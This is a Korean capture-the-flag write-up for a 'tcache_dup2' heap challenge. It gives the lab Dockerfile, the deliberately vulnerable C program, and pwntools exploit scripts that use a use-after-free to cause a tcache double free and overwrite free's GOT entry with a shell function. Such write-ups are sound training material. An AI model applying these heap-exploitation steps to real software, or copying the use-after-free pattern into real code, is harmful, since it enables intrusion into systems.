# Exercise: tcache_dup2

**실습 환경**

```python
Ubuntu 19.10
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

**실습 도커파일**

```python
FROM ubuntu:19.10

ENV PATH="${PATH}:/usr/local/lib/python3.7/dist-packages/bin"
ENV LC_CTYPE=C.UTF-8

RUN sed -i 's|http://.*.ubuntu.com|http://old-releases.ubuntu.com|g' /etc/apt/sources.list

RUN apt update && apt install -y \
    gcc \
    git \
    python3 \
    python3-pip \
    ruby-full \
    sudo \
    tmux \
    vim \
    wget \
    make \
    g++ \
    libstdc++6 \
    libssl-dev \
    libffi-dev \
    gdb \
    patchelf \
    curl \
    xz-utils

WORKDIR /root
RUN git clone https://github.com/pwndbg/pwndbg
WORKDIR /root/pwndbg
RUN git checkout 2023.03.19
RUN ./setup.sh

RUN pip3 install --upgrade pip
RUN pip3 install pwntools

RUN gem install one_gadget -v 1.6.2

WORKDIR /root
COPY libc-2.30.so .
COPY tcache_dup2.c .
COPY tcache_dup2 .
COPY flag .

RUN chmod +x tcache_dup2

CMD ["/bin/bash"]

```

```python
docker build -t tcache_env .
docker run -it --rm --privileged tcache_env
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[7];

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

void create_heap(int idx) {
    size_t size;

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    ptr[idx] = malloc(size);

    if (!ptr[idx])
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size-1);
}

void modify_heap() {
    size_t size, idx;

    printf("idx: ");
    scanf("%ld", &idx);

    if (idx >= 7)
        exit(0);

    printf("Size: ");
    scanf("%ld", &size);

    if (size > 0x10)
        exit(0);

    printf("Data: ");
    read(0, ptr[idx], size);
}

void delete_heap() {
    size_t idx;

    printf("idx: ");
    scanf("%ld", &idx);
    if (idx >= 7)
        exit(0);

    if (!ptr[idx])
        exit(0);

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}
int main() {
    int idx;
    int i = 0;

    initialize();

    while (1) {
        printf("1. Create heap\n");
        printf("2. Modify heap\n");
        printf("3. Delete heap\n");
        printf("> ");

        scanf("%d", &idx);

        switch (idx) {
            case 1:
                create_heap(i);
                i++;
                break;
            case 2:
                modify_heap();
                break;
            case 3:
                delete_heap();
                break;
            default:
                break;
        }
    }
}
```

**코드 분석**

이 문제는 Tcache Poisoning 문제랑 비슷하게, 메모리 Modify를 통해 Key 값을 변조하고 DFB 를 일으키는 문제처럼 보인다. 

그리고 `get_shell` 함수도 따로 존재하니, 쉘을 얻는 방법도 쉽게 알아낼 수 있다.

<br>

**동적 분석**

일단은 코드를 바로 실행 시켜서  

<br>

(사진1)

이렇게 넣어줬다.  

<br>

(사진2)

그리고 `heap`을 보면 key 값이 이렇게 망가져있는 것을 볼 수 있다. 

그러면 저기에 맞춰서 익스플로잇 코드를 살짝만 짜보자.  

<br>

**익스플로잇 코드 (앞 쪽만)**

```c
from pwn import *

p = process('./tcache_dup2')
e = ELF('./tcache_dup2')
libc = ELF('./libc-2.30.so')

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())

create(48, b'AAAA')
delete(0)
modify(0, 16, b'A'*8 + b'\x00'*8) 
delete(0)

               
```

(사진3)

이걸로 돌려보면, 당연히 프로세스가 멈추고,  

No pie 와 Partial RELRO 가 보이니 GOT overwrite가 생각이 났다.  

그래서 이후 코드도 한번 써보면,  

<br>


**익스플로잇 코드 (실패)**

```python
from pwn import *

p = process('./tcache_dup2')
e = ELF('./tcache_dup2')
libc = ELF('./libc-2.30.so')

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def modify(idx, size, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())

create(0x10, b'AAAA')
delete(0)
modify(0, 0x10, b'A'*8 + b'\x00'*8)
delete(0)

free_got = e.got['free']
get_shell = e.symbols['get_shell']

create(0x10, p64(free_got))
create(0x10, b'B'*8)
create(0x10, p64(get_shell))

delete(0)

p.interactive()
```

(사진4)
